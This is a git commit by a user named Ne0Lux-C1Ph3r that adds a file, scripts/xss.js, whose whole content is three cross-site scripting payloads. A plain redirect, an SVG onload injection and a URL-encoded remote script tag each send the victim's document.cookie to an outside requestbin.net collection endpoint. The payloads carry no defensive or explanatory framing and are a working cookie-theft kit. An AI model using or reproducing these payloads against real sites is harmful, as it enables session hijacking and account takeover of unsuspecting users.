b53859a5325da61b3a34db39c51cdd48c54fa85c
Ne0Lux-C1Ph3r <neolux-cipher@hotmail.fr>
2019-10-25 05:25:10 +0200

    Create xss.js

---
+++ scripts/xss.js
@@ -0,0 +1,3 @@
+document.location="http://requestbin.net/r/17fs0tk1?" + document.cookie;
+"><svg/onload=location="http://requestbin.net/r/17fs0tk1?" + document.cookie>;
+%3C/script%3E%3Cscript/src=//requestbin.net/r/17fs0tk1%3E%3C/script%3E
